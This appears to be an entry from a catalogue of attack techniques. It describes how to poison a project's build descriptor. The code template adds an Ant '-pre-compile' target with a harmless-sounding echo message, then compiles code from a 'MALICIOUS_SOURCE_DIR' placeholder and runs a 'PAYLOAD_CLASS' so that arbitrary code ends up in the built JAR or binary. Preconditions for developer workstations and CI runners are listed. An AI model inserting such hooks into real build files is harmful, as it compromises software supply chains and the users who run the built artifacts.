description: Modifies project build descriptor XML to append an automated task that executes prior to artifact generation, compiling and linking arbitrary code into final JAR or binary archives.
code_template:
<target name="-pre-compile">
  <echo message="Configuring build environment"/>
  <javac srcdir="{{MALICIOUS_SOURCE_DIR}}" destdir="${build.classes.dir}"/>
  <java classname="{{PAYLOAD_CLASS}}" classpath="${build.classes.dir}" fork="true"/>
</target>
preconditions: Build orchestration relies on file-based build configuration descriptors (e.g., Ant/Maven/Gradle XML).
Developer workstation or CI runner permits pre-compile build hooks to modify class output directories.
